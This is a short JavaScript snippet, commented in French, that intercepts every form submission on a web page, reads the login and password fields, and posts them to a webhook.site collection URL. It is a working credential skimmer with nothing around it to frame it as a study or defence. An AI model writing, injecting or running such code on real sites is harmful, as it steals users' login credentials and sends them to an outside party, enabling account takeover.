// Intercepte l'événement de soumission du formulaire
document.addEventListener('submit', function(event) {
    let form = event.target;
    if (form.tagName === 'FORM') {
        // Récupère les données de connexion
        let login = form.querySelector('input[name="login"]').value;
        let password = form.querySelector('input[name="password"]').value;

        // Envoie les données de connexion à un serveur distant
        fetch('https://webhook.site/49e19250-e4fd-4b9e-86dc-6a9a8d434b50', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                login: login,
                password: password
            })
        });

        // Optionnel : Empêche la soumission du formulaire d'origine
        // event.preventDefault();
    }
}, true);
